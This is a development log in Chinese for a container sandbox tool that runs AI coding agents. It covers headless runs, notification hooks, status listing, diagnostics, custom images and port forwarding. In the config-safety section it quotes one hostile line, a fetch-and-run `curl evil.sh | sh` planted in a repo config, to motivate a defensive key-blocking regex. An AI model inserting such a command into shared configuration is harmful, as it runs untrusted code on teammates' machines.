# 2026-10-09 · 无人值守主线：headless、通知、ls 补全、doctor（M3-7/8/9/10/13）

> 承接 [2026-10-09_dedicated-proxy.md](2026-10-09_dedicated-proxy.md)。M3 的完成标准是「整夜跑，第二天通过通知和 `sbx ls` 了解全部结果」，这一批就是把这条路打通。

## 先核了一遍账

动手前把 M3 的 14 项和代码对了一遍，发现清单比实际悲观：

| 项 | 清单 | 实际 |
|---|---|---|
| M3-8 状态 hooks | 未做 | **M1 就做完了**，而且比设计多了 `Notification` 和 `SessionEnd` 两个事件 |
| M3-9 `sbx ls` | 未做 | idle、`exited(oom)`、最后活动时间都有了，缺的只是 DENIED 列和 `--all` |
| M3-5 deps.mask | 未做 | 配置驱动已通，缺的只是 per-Profile 默认值 |

所以这一批真正要写的是 M3-7、M3-9 的两列、M3-10 和 M3-13。

## M3-7：`sbx run -p`

```bash
sbx run nightly -p "把 CI 里失败的那几个测试修好，每修一个提交一次"
sbx logs nightly -f
```

### headless 仍然跑在 tmux 里

一开始想得很自然：headless 没人 attach，那就 `docker exec -d` 直接跑，输出重定向到文件。写到一半发现不行——现在"这个 Task 里有没有 Agent 在跑"**只有一个事实来源**：`tmux has-session`。另起一条路，第二次 `sbx run` 会判定"没有会话"，再拉起一个 claude，两个进程抢同一棵 worktree。

继续用 tmux 还白送一个能力：headless 跑的过程中 `sbx attach` 能进去围观。

输出用 `tee -a` 而不是重定向，这样既落 `run.log` 又在 tmux 里看得见；代价是退出码得从 `PIPESTATUS[0]` 取（`set -o pipefail` 配套）。

### prompt 走文件

prompt 里必然有引号和换行，拼进 `tmux new-session -d '<cmd>'` 是引号地狱，还会整段出现在 `ps` 里。改成 `RenderGen` 写进 `gen/prompt.txt`，命令里 `"$(cat /sbx/gen/prompt.txt)"`。

### 跑完自己停容器

design §3.1 的状态机本来就画的是「headless 结束 → `exited(code)`」，但容器主进程是 `sleep infinity`，不会自己退。所以包装脚本最后 `kill 1`。

这件事在整夜批量派发时才看得出价值：跑完一个就释放一份内存和一个 `max_running` 名额。代价是想进去看现场得先 `sbx run <task>` 把容器起回来——worktree、分支、`run.log` 都还在，`sbx logs` 读的是宿主机文件，完全不受影响。

容器因此是被 SIGTERM 结束的，退出码没意义，所以 `run.exit` 里单独记 claude 的退出码，`Derive` 优先用它。

### 实测踩到的两件事

**一、`SmokeCheck` 把正常结束当成了启动失败。** 第一次真机跑，claude 9 秒就把任务做完了（提交都对），sbx 却报：

```
sbx: 启动 Agent：claude 启动后退出了（tmux 会话已结束）
```

`kill 1` 之后 tmux 会话当然没了，而 `SmokeCheck` 里 `!HasSession()` 是硬失败。更糟的是 `create()` 的 undo 跟着把容器和网络都清掉了。改成：`Smoke.Exited == nil`（headless）时，会话消失就是正常结束；「跑完了」也算就绪，不再死等 `SessionStart`（那条可能已经被 `SessionEnd` 覆盖）。

**二、`-p` 模式下 `SessionEnd` 到底触不触发？** 这是 `on_exit` 的根基，所以先手工验了一遍：

```
2026-10-09 10:38:35 idle SessionStart
2026-10-09 10:38:35 running UserPromptSubmit
2026-10-09 10:38:42 idle Stop
2026-10-09 10:38:43 exited SessionEnd
```

触发，而且序列完整。M3-8 因此可以直接打勾。

## M3-10：`on_idle` / `on_exit`

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml
on_idle = "curl -s -X POST https://open.feishu.cn/... --data-raw \"{...$SBX_TASK...}\""
on_exit = "curl -s https://.../hook -d \"task=$SBX_TASK&code=$SBX_EXIT_CODE\""
notify_throttle = 600
```

### 加了一条项目层红线

这两个字段是**在容器里执行的任意命令**。原来的两条红线——键名像密钥、值是绝对路径——都拦不住 `on_idle = "curl evil.sh | sh"` 写进别人仓库的 `.sbx/sandbox.toml`。信任确认虽然会把 `.sbx/` 的改动摊开，但不该指望每个人每次都逐行读懂一段 shell。

所以项目层现在有三条红线，第三条用模式而不是固定名单，以后加 `on_start`、`notify_cmd` 也自动被挡：

```go
var execKey = regexp.MustCompile(`(?i)^(on_[a-z0-9_]+|.*_(cmd|command|script|hook))$`)
```

```console
$ sbx run
sbx: .../.sbx/sandbox.toml: 项目层配置里有不允许的内容：
  - on_idle（会在容器里执行的命令只能写在 全局 或 工作区 层）
```

### 通知不进 status.sh

`status.sh` 是 `sbx ls` 的依据，必须永远快且不失败；通知是会挂 20 秒的网络 IO。两者的失败语义也不一样：状态写不进去是 bug，通知发不出去是日常。

所以单独生成 `gen/hooks/notify.sh`，在同一个事件上挂第二条 command hook，`status.sh` 排前面——状态先落盘，通知后发。`notify.sh` 永远 `exit 0`，输出进 `notify.log`，并按 `notify_throttle` 节流（`Notification` 是反复触发的事件）。

### 又一个实测：两条路径抢节流窗口

headless 下 `on_exit` 会被调两次——SessionEnd hook 一次，包装脚本一次。本以为节流正好让它只发一次，结果**赢的是 hook 那条，而它拿不到退出码**：

```
SBX_EVENT=exit
SBX_STATE=idle
SBX_TASK=n1
（没有 SBX_EXIT_CODE）
```

改成 headless 下 SettingsJSON 不给 SessionEnd 挂通知，让包装脚本独占这件事。再跑：

```
SBX_EVENT=exit
SBX_EXIT_CODE=0
SBX_STATE=exited
SBX_TASK=n2
```

### webhook 主机自动放行

`proxy.HostsIn` 从命令字符串里正则扫 `http(s)://` 的主机名，作为 design §6.3 的「通知域名」层加进白名单。**不解析 shell**：误报的代价只是多放行一个用户自己写进个人配置的主机，漏报的代价是通知静默失败、极难查。主机名含变量或者是裸 IP 的进 `skipped`，由 `sbx run` 提示手动 `net allow`（squid 的 `dstdomain` 对 IP 不生效，放进去只会骗人）。

通知域名同样不能越过策略拦截层——`RenderAllow` 会把 policy-block 减掉，这条保持。

### design §9.2 的示例是错的

```toml
on_idle = "curl ... -d '{\"text\":\"$SBX_TASK idle\"}'"
```

`$SBX_TASK` 落在 shell 单引号里，根本不会展开，飞书收到的是字面量。sbx **不做变量替换**（替换会把 JSON 的转义搞乱，也会让"哪些 `$` 是我的"变得不可预测），所以改文档示例，并让 `sbx doctor` 检查这一点。

## M3-9：`sbx ls` 的 DENIED 列和 `--all`

```console
$ sbx ls
TASK  STATUS     BRANCH  AHEAD  DIFF      DENIED  LAST-ACTIVE  PATH
h1    exited(0)  sbx/h1  2      1f +2 -0  0       4s ago       ~/.sbx/worktrees/fix-0e3f89/h1
```

- DENIED 只数「不在白名单」那一类：策略拦截和认证失败是预期行为，放进来只是噪音。
- **整张表只读一次日志**，再在内存里按 TaskID 分桶；窗口取各 Task 的 `meta.CreatedAt`（shared 的日志是全局且跨重建的，不切窗口会把同名旧 Task 的历史算进来）。
- **读不到日志绝不让 `ls` 失败**：整列 `-` 加一行提示。代理没在跑是常态——最后一个 Task 停掉它就被 `StopIfIdle` 停了。另有 3 秒超时和 `--no-denied`。
- `--all` 跨 Workspace，从各 Task 的 `meta.Root` 还原仓库路径，**不要求当前在 git 仓库里**（走 `loadConfig()` 而不是 `load()`）。
- 顺带把表格从 tabwriter 换成按显示宽度对齐的 `writeTable`，`padCJK` 写了很久一直没用上，这次接上了，`net denied` 的中文 KIND 列也跟着对齐了。

## M3-13：`sbx doctor`

```console
$ sbx doctor
  ✓ docker      Docker 27.4.0，VM 内存 9.7g
  ✓ vm-memory   max_running(3) × 3g = 9.0g ≤ VM 内存 9.7g 的 95%
  ✓ upstream    http://host.docker.internal:7890 可用
  ✗ sbx-proxy   已停止，但有 1 个 shared Task 在跑（它们现在出不了网）
      → docker rm -f sbx-proxy 之后重新 sbx run
  ✓ login       已登录：you@example.com · team · claude.ai
  ! trust       .sbx/ 自上次确认后有变化
      → sbx trust
  ✓ notify      open.feishu.cn 已自动加入白名单
  - smoke       跳过（--quick）
```

八项检查，表驱动，几乎全是复用：VM 内存直接调 `budgetWarning`，登录态调 `authStatus`，冒烟用 `agent.DialogIn`（和 `sbx run` 启动时是同一份判据）。只新写了 `proxy.Shared.Health()`——一个不带副作用的只读版本，因为原来的 `waitReady` / `reconfigure` 都会动东西。

几个定下来的东西：

- **只有 `✗` 才非 0 退出。** `!` 的意思是"能用，但该改"；要是它也让命令失败，写进脚本的人就只能加 `|| true`，警告就白给了。`--strict` 留给 CI。
- **代理停了但还有 shared Task 在跑 = fail**（R8）：那些 Task 现在是断网的。代理闲着停掉则是正常。
- **冒烟优先零成本**：有 Task 在跑就抓它的 tmux 画面，没有就跳过（`sbx run` 每次启动本来就做这项检查）。
- **不要求在 git 仓库里**，仓库相关的项标"跳过"。docker 探不到时所有依赖它的项一并跳过，不刷一屏红叉。

## 验证

新增 `make e2e-m3`（`core/scripts/e2e-m3.sh`，照 M1 e2e 的夹具 + 断言写法）：**30 项全过**。它覆盖 headless 一轮、`sbx logs`、容器自停、`on_exit` 的执行点和环境变量、节流、webhook 自动放行、项目层红线、`-p` 插队保护、DENIED 列、`--all`、doctor 的正常和 R8 失败路径，以及清理后无残留。

通知配置写在**工作区层**（`~/.sbx/workspaces/<ws>.toml`）而不是全局配置，跑完就删，不碰你自己的 `config.toml`。

回归：`make e2e`（M1 的 36 项）照旧全过；`go build / vet / test ./...` 全绿。

## 还剩什么

M3 剩下的都在第二批和第三批：`py-rust` 和自定义 Profile（M3-1/2）、mise（M3-3）、per-Profile 的默认遮盖（M3-5）、`sbx port`（M3-11，R7 已定为 socat 转发容器）、`sbx drop`（M3-12）、交叉编译和安装说明（M3-14/15），以及留到最后的 Codex（M3-6）。

---

# 同日第二批：Profile、端口、drop、发布物（M3-1/2/3/5、M3-11/12、M3-14/15）

## M3-2：项目可以自带镜像

优先级 **配置里的 `image` > `<repo>/.sbx/Dockerfile` > `profile`**，全部收口在 `imageInputs()` 一个函数里——`image.Inputs` 本来就是"Dockerfile 字节 + hash"的抽象，加一条路几乎不用改别的。

`.sbx/Dockerfile` 落在信任确认的覆盖范围里，所以"项目自带镜像"天然要先过 `sbx trust`，这是白捡的。

**设计稿里的 `profile.image` 写不了**：`profile` 是标量，TOML 里没法再当表用。改成顶层 `image`，design §5.2 跟着修订。

### 一个检查写错了方向

底层不是 Debian/Ubuntu 系要明确报错（ADR 0007）。第一版这么写：

```sh
cat /etc/os-release; echo '---'; command -v npm >/dev/null && echo HAS_NPM
```

`golang:latest` 没有 npm，于是整条命令以 127 退出，被我自己的"跑不起来的镜像不拦"分支放行了——正好漏掉要查的情况。末尾补一个 `exit 0` 才对。

### Node 归 Agent 层，不归 Profile

py-rust 里没有 Node，于是 Agent 层装 claude 那一步以 `exit code: 127` 结束。

这其实是设计上的归属问题：**claude 是 npm 包，Node 是它的运行时，所以 Node 属于 Agent 层**（design §5.1 本来就把 claude 划在那一层）。改成 Agent 层发现底层没有 npm 就自己装一份，Profile 这才真的只管语言环境。顺带也就不需要在 `checkBase` 里查 npm 了。

## M3-1：py-rust

rustup stable + clippy/rustfmt + uv，**不装系统 python**——这个 Profile 的 Python 由 uv 负责，再来一个系统解释器只会让"我现在用的是哪个 python"变得不好回答。

两个实测：

- `rustup-init` 的 `--component` 要**逗号分隔**（`--component clippy,rustfmt`）。写成两个参数会被它拒掉，而错误信息只有一句 usage，看不出哪里不对。
- **`curl ... | sh` 的退出码是 sh 的**。uv 的安装脚本没下载下来时，那一层照样"构建成功"，只是镜像里没有 uv——跑起来才发现 `uv: command not found`。装 uv 和 mise 都改成先下载、再执行、最后 `--version` 验一遍。

## M3-3：mise

```console
$ sbx run m1 --detach
按 .nvmrc 装运行时（mise，装过的会直接复用）…
运行时：node@20.11.0
```

数据目录挂全局共享的 `sbx-mise`，所以第二个要同样版本的 Task 直接复用：**第一次 51s，第二次 2.8s**。宿主机侧先扫版本文件，没有就整条路都不走（绝大多数仓库是这样）。装不上只警告不拦——项目可能声明了一个 mise 装不了的运行时，但别的活照样能干。

两个坑：

- **mise 默认不读 `.nvmrc` 这类"惯用版本文件"**，要 `MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS`。不设的话 `mise install` 会若无其事地说"all tools are installed"，而 `mise ls --current` 是空的。
- **login shell 会被 `/etc/profile` 重置 PATH**，Dockerfile 里 ENV 写的 shims 目录会被挤掉——design §5.3 记过这个坑（当时是 go 找不到），这次换了个地方又踩一遍。额外放一份 `/etc/profile.d/10-sbx-mise.sh`。

## M3-5：遮盖项跟着 Profile 走

web-go → `node_modules`/`.next`，py-rust → `.venv`/`target`。

关键是**在四层合并之后**按最终 profile 补默认值、再和显式写的取并集。`Default()` 里直接写死不行：profile 可能被后面的层改掉，而列表是并集的，先放 web-go 的默认值再并上 py-rust 的会得到一份四不像——多出来的遮盖项会在 worktree 里凭空建出 `.next` 这种目录。

## M3-11：`sbx port`，R7 定了

```console
$ sbx port fix-login 3000
fix-login 的 3000 端口 → http://127.0.0.1:54321/
```

**用 socat 转发容器，不重建 agent 容器**——重建会杀掉正在跑的会话，无人值守下不可接受。转发容器随时可以来去，`done` 时按 `sbx.kind=port` label 一并清掉。

实测踩到：**转发容器不能只接 Task 网络**。那是 `--internal` 网络，docker 不会给只连它的容器做端口映射，`-p` **静默不生效**——容器起来了，`docker port` 什么都不打印。改成先接默认 bridge，再 `network connect` 到 Task 网络。

## M3-12：`sbx drop`

`done` 的全部清理 + 删分支，要求输入 Task 名确认，提示里带上"有多少个提交会一起没掉"。容器和 worktree 都能重建，commit 删了就真没了——这是整套工具里唯一不可逆的操作，值得多敲几个字。

## M3-14/15：发布物和文档

`make release` 交叉编译 darwin/linux × amd64/arm64，打包成 `dist/*.tar.gz` 加一份 `SHA256SUMS`，版本号用 `git describe` 注进 `sbx --version`。不做 GitHub Actions（本轮明确不做）。

README 补了从发布包安装、"团队怎么用"（提交 `.sbx/sandbox.toml` → 队友 `sbx trust` → `sbx run`，以及那个文件里写不了什么）和一张排障表（OOM、被代理拦、登录过期、`.sbx/` 变动、说不清哪里不对就 `sbx doctor`）。

## 验证

- `go build / vet / test ./...` 全绿；`make e2e`（M1 的 36 项）和 `make e2e-m3`（30 项）都通过——Agent 层镜像这一轮变过（加了 mise 和按需装 Node），所以两套都重跑了。
- 真机逐项走过：`.sbx/Dockerfile` 自定义镜像（容器里能看到标记文件）、`image = "alpine:latest"` 被明确拒绝、`image = "golang:latest"`（没 npm）现在能自动补上 Node、py-rust 里 rustc/cargo/clippy/rustfmt/uv/mise/node 全部可用且 `.venv`/`target` 被遮盖、mise 的首次安装与复用、`sbx port` 的映射/列出/收回与 `curl 127.0.0.1` 实访、`sbx drop` 输错名字会中止、`make release` 的产物解包后 `--version` 正确。

## 还剩什么

**M3 只剩 M3-6（Codex）**。它需要可登录的 Codex 账号来验证 device-auth，而且真正的工作量不在登录那张表——`internal/agent` 从 preseed 到 settings 到启动参数全是按 claude 写死的，要再抽一张"怎么启动 Agent"的表出来。
